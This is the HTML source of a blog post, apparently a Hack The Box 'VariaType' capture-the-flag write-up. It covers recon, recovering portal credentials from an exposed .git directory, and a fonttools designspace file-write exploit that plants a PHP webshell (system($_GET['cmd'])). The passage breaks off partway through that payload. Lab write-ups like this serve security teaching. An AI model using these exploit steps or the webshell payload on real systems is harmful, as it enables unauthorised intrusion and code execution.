@@ -1,0 +1,932 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2026/06/16/hackthebox-variatype/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewVariaType is a medium-difficulty Linux machine from Hack The Box that revolves around font tooling. We start by dumping an exposed .git directory to recover portal credentials, then abuse an a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: VariaType">
+<meta property="og:url" content="http://fouedsaidi.com/2026/06/16/Hackthebox-VariaType/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewVariaType is a medium-difficulty Linux machine from Hack The Box that revolves around font tooling. We start by dumping an exposed .git directory to recover portal credentials, then abuse an a">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/VariaType/VariaType.png">
+<meta property="article:published_time" content="2026-06-16T19:30:40.000Z">
+<meta property="article:modified_time" content="2026-06-16T19:58:17.190Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/VariaType/VariaType.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: VariaType -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: VariaType</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-06-16 22:30:40</span>
+        <span class="mobile">2026-06-16 22:30:40</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-06-16 22:58:17</span>
+            <span class="mobile">2026-06-16 22:58:17</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>VariaType is a medium-difficulty Linux machine from Hack The Box that revolves around font tooling. We start by dumping an exposed <code>.git</code> directory to recover portal credentials, then abuse an arbitrary file write in <code>fonttools</code> (GHSA-768j-98cg-p3fv) combined with a PHP payload smuggled through a font name table to drop a webshell as <code>www-data</code>. From there we exploit a FontForge archive command injection (CVE-2024-25081) through a cron-monitored directory to move laterally to <code>steve</code>, and finally abuse a <code>setuptools</code> <code>PackageIndex</code> path traversal inside a <code>sudo</code>-allowed script to plant an SSH key in root’s home and own the box.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/VariaType/VariaType.png"
+                      alt="VariaType-info-card"
+                ><figcaption>VariaType-info-card</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>We kick things off with a full nmap service scan to identify what’s exposed on the target.</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p- 10.129.5.193</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7</span><br><span class="line">80/tcp open  http    nginx/1.22.1</span><br></pre></td></tr></table></figure></div>
+
+<p>Only two ports — SSH and an nginx web server. The Debian version and OpenSSH banner place this firmly on Debian 12 (Bookworm).</p>
+<h2 id="Web-application-http-variatype-htb"><a href="#Web-application-http-variatype-htb" class="headerlink" title="Web application - http://variatype.htb"></a>Web application - <a class="link"   target="_blank" rel="noopener" href="http://variatype.htb/" >http://variatype.htb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><p>Browsing directly to <code>http://10.129.5.193</code> returns the homepage for <strong>VariaType Labs</strong>, a company offering “variable font generation” services. The page title, footer, and internal links all reference the hostname <code>variatype.htb</code>, so that’s the first addition to <code>/etc/hosts</code>.</p>
+<p>Next, we run <code>ffuf</code> for subdomain&#x2F;vhost enumeration against the target:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u http://10.129.5.193 -H <span class="string">&quot;Host: FUZZ.variatype.htb&quot;</span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs &lt;default_size&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>This reveals <code>portal.variatype.htb</code> — a second virtual host returning a different page (a login form). We add both hostnames:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;10.129.5.193 variatype.htb portal.variatype.htb&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br></pre></td></tr></table></figure></div>
+
+<p>The main site (<code>variatype.htb</code>) is a public-facing marketing&#x2F;tool page with a variable font generator at <code>/tools/variable-font-generator</code>. The portal (<code>portal.variatype.htb</code>) presents a login form titled “Internal Validation Portal — For authorized personnel only.”</p>
+<h2 id="Exposed-git-Repository-Credential-Leak"><a href="#Exposed-git-Repository-Credential-Leak" class="headerlink" title="Exposed .git Repository &amp; Credential Leak"></a>Exposed .git Repository &amp; Credential Leak</h2><p>We run Nuclei against the portal subdomain to check for common misconfigurations:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nuclei -u http://portal.variatype.htb -t http/exposures/</span><br></pre></td></tr></table></figure></div>
+
+<p>Nuclei flags a medium-severity finding: <code>[git-config] [http] [medium] http://portal.variatype.htb/.git/config</code>. This means the entire <code>.git</code> directory is accessible via the web server — nginx is serving it without restriction.</p>
+<p>We confirm it manually:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s http://portal.variatype.htb/.git/config</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Ini"><figure class="iseeu highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[core]</span></span><br><span class="line">    <span class="attr">repositoryformatversion</span> = <span class="number">0</span></span><br><span class="line">    <span class="attr">filemode</span> = <span class="literal">true</span></span><br><span class="line">    <span class="attr">bare</span> = <span class="literal">false</span></span><br><span class="line">    <span class="attr">logallrefupdates</span> = <span class="literal">true</span></span><br><span class="line"><span class="section">[user]</span></span><br><span class="line">    <span class="attr">name</span> = Dev Team</span><br><span class="line">    <span class="attr">email</span> = dev@variatype.htb</span><br></pre></td></tr></table></figure></div>
+
+<p>With <code>.git</code> fully exposed, we use <code>git-dumper</code> to reconstruct the repository locally:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git-dumper http://portal.variatype.htb/.git /tmp/git-repo</span><br><span class="line"><span class="built_in">cd</span> /tmp/git-repo</span><br><span class="line">git <span class="built_in">log</span> --oneline --all</span><br></pre></td></tr></table></figure></div>
+
+<p>This pulls down the full commit history. Walking through the commits with <code>git log -p</code> reveals a critical diff in <code>auth.php</code> — a previous commit had added hardcoded credentials that were later removed, but they remain in the git history:</p>
+<div class="highlight-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/auth.php b/auth.php</span></span><br><span class="line"><span class="comment">index 615e621..b328305 100644</span></span><br><span class="line"><span class="comment">--- a/auth.php</span></span><br><span class="line"><span class="comment">+++ b/auth.php</span></span><br><span class="line"><span class="meta">@@ -1,3 +1,5 @@</span></span><br><span class="line"> &lt;?php</span><br><span class="line"> session_start();</span><br><span class="line"><span class="deletion">-$USERS = [];</span></span><br><span class="line"><span class="addition">+$USERS = [</span></span><br><span class="line"><span class="addition">+    &#x27;gitbot&#x27; =&gt; &#x27;G1tB0t_Acc3ss_2025!&#x27;</span></span><br><span class="line"><span class="addition">+];</span></span><br></pre></td></tr></table></figure></div>
+
+<p>We use the discovered credentials to authenticate to the portal login form:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -s -X POST http://portal.variatype.htb/ \</span><br><span class="line">  -d <span class="string">&#x27;username=gitbot&amp;password=G1tB0t_Acc3ss_2025!&#x27;</span> \</span><br><span class="line">  -c /tmp/cookies.txt -L</span><br></pre></td></tr></table></figure></div>
+
+<p>The server returns a <code>302</code> redirect to <code>/dashboard.php</code> with a valid <code>PHPSESSID</code> cookie. The dashboard page shows a section titled “Recent font builds from the variable font generator” with the message “No generated fonts found.” — indicating it displays files generated by the main site’s font pipeline. This tells us the portal’s public files directory (<code>/files/</code>) is where generated fonts land, which becomes important for the next step.</p>
+<h2 id="Foothold-Arbitrary-File-Write-via-fonttools-Designspace-RCE-as-www-data"><a href="#Foothold-Arbitrary-File-Write-via-fonttools-Designspace-RCE-as-www-data" class="headerlink" title="Foothold - Arbitrary File Write via fonttools Designspace (RCE as www-data)"></a>Foothold - Arbitrary File Write via fonttools Designspace (RCE as www-data)</h2><h3 id="Understanding-the-Font-Generator"><a href="#Understanding-the-Font-Generator" class="headerlink" title="Understanding the Font Generator"></a>Understanding the Font Generator</h3><p>The main site at <code>http://variatype.htb/tools/variable-font-generator</code> presents an upload form that accepts:</p>
+<ul>
+<li>A <code>.designspace</code> file (XML configuration defining font axes and sources)</li>
+<li>One or more master font files (<code>.ttf</code> or <code>.otf</code>)</li>
+</ul>
+<p>After uploading, it runs <code>fonttools varLib</code> on the server side to compile a variable font. Reading the application source at <code>/opt/variatype/app.py</code> (accessible later from the shell, but the behavior was deducible from the upload form and response patterns) confirms the backend:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># From /opt/variatype/app.py — the processing endpoint</span></span><br><span class="line">subprocess.run(</span><br><span class="line">    [<span class="string">&#x27;fonttools&#x27;</span>, <span class="string">&#x27;varLib&#x27;</span>, <span class="string">&#x27;config.designspace&#x27;</span>],</span><br><span class="line">    cwd=workdir,</span><br><span class="line">    check=<span class="literal">True</span>,</span><br><span class="line">    timeout=<span class="number">30</span></span><br><span class="line">)</span><br><span class="line"><span class="comment"># After processing, copies the first output file to:</span></span><br><span class="line"><span class="comment"># /var/www/portal.variatype.htb/public/files/</span></span><br></pre></td></tr></table></figure></div>
+
+<p>The key detail: the output variable font ends up in the portal’s public <code>/files/</code> directory — the same directory served by nginx under <code>portal.variatype.htb</code>.</p>
+<h3 id="Identifying-the-Vulnerability-GHSA-768j-98cg-p3fv"><a href="#Identifying-the-Vulnerability-GHSA-768j-98cg-p3fv" class="headerlink" title="Identifying the Vulnerability (GHSA-768j-98cg-p3fv)"></a>Identifying the Vulnerability (GHSA-768j-98cg-p3fv)</h3><p>The <code>.designspace</code> XML format supports a <code>&lt;variable-fonts&gt;</code> section where each <code>&lt;variable-font&gt;</code> element has a <code>filename</code> attribute specifying where the generated font should be written. Researching fonttools security advisories reveals <strong>GHSA-768j-98cg-p3fv</strong>: fonttools does not sanitize the <code>filename</code> attribute in designspace files. An attacker can set it to an <strong>absolute path</strong> (e.g., <code>/var/www/.../shell.php</code>), and fonttools will write the compiled font file to that exact location.</p>
+<p>Additionally, the font’s internal name table entries (like <code>&lt;labelname&gt;</code>) get embedded verbatim into the output binary. By placing a PHP payload inside a <code>&lt;![CDATA[...]]&gt;</code> block within a <code>&lt;labelname&gt;</code> tag, the PHP code survives compilation and ends up inside the output file. Since the output file can be given a <code>.php</code> extension via the filename attribute, and nginx&#x2F;php-fpm is configured to execute <code>.php</code> files, this results in <strong>remote code execution</strong>.</p>
+<h3 id="Crafting-the-Exploit"><a href="#Crafting-the-Exploit" class="headerlink" title="Crafting the Exploit"></a>Crafting the Exploit</h3><p>First, we create two minimal valid TTF master fonts. The generator requires real font files — dummy&#x2F;empty files cause a processing error. We use Python’s <code>fontTools</code> library to build minimal but structurally valid fonts:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fontTools.fontBuilder <span class="keyword">import</span> FontBuilder</span><br><span class="line"><span class="keyword">from</span> fontTools.pens.ttGlyphPen <span class="keyword">import</span> TTGlyphPen</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> fname <span class="keyword">in</span> [<span class="string">&#x27;source-light&#x27;</span>, <span class="string">&#x27;source-regular&#x27;</span>]:</span><br><span class="line">    fb = FontBuilder(<span class="number">1000</span>, isTTF=<span class="literal">True</span>)</span><br><span class="line">    fb.setupGlyphOrder([<span class="string">&#x27;.notdef&#x27;</span>, <span class="string">&#x27;space&#x27;</span>])</span><br><span class="line">    fb.setupCharacterMap(&#123;<span class="number">32</span>: <span class="string">&#x27;space&#x27;</span>&#125;)</span><br><span class="line">    pen = TTGlyphPen(<span class="literal">None</span>)</span><br><span class="line">    notdefGlyph = pen.glyph()</span><br><span class="line">    pen2 = TTGlyphPen(<span class="literal">None</span>)</span><br><span class="line">    spaceGlyph = pen2.glyph()</span><br><span class="line">    fb.setupGlyf(&#123;<span class="string">&#x27;.notdef&#x27;</span>: notdefGlyph, <span class="string">&#x27;space&#x27;</span>: spaceGlyph&#125;)</span><br><span class="line">    fb.setupHorizontalMetrics(&#123;<span class="string">&#x27;space&#x27;</span>: (<span class="number">250</span>, <span class="number">0</span>), <span class="string">&#x27;.notdef&#x27;</span>: (<span class="number">500</span>, <span class="number">0</span>)&#125;)</span><br><span class="line">    fb.setupHorizontalHeader(ascent=<span class="number">800</span>, descent=-<span class="number">200</span>)</span><br><span class="line">    fb.setupNameTable(&#123;<span class="string">&#x27;familyName&#x27;</span>: <span class="string">&#x27;Test&#x27;</span>, <span class="string">&#x27;styleName&#x27;</span>: <span class="string">&#x27;Regular&#x27;</span>&#125;)</span><br><span class="line">    fb.setupOS2(sTypoAscender=<span class="number">800</span>, sTypoDescender=-<span class="number">200</span>, usWeightClass=<span class="number">400</span>)</span><br><span class="line">    fb.setupPost()</span><br><span class="line">    fb.setupHead(unitsPerEm=<span class="number">1000</span>)</span><br><span class="line">    fb.font.save(<span class="string">f&#x27;/tmp/<span class="subst">&#123;fname&#125;</span>.ttf&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>Then we craft the malicious <code>.designspace</code> file. The exploit has two parts working together:</p>
+<ul>
+<li>The <code>filename</code> attribute on <code>&lt;variable-font&gt;</code> is set to an absolute path ending in <code>.php</code> inside the portal’s web-accessible directory</li>
+<li>A PHP webshell payload (<code>&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;</code>) is embedded in a <code>&lt;labelname&gt;</code> CDATA block, which fonttools preserves in the output font’s name table</li>
+</ul>
+<p>The CDATA nesting (<code>]]]]&gt;&lt;![CDATA[&gt;</code>) is needed to properly close the inner CDATA while keeping the <code>?&gt;</code> PHP closing tag intact through XML parsing:</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;UTF-8&#x27;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">designspace</span> <span class="attr">format</span>=<span class="string">&quot;5.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">axes</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">axis</span> <span class="attr">tag</span>=<span class="string">&quot;wght&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Weight&quot;</span> <span class="attr">minimum</span>=<span class="string">&quot;100&quot;</span> <span class="attr">maximum</span>=<span class="string">&quot;900&quot;</span> <span class="attr">default</span>=<span class="string">&quot;400&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">labelname</span> <span class="attr">xml:lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>&lt;![CDATA[&lt;?php system($_GET[&quot;cmd&quot;]); 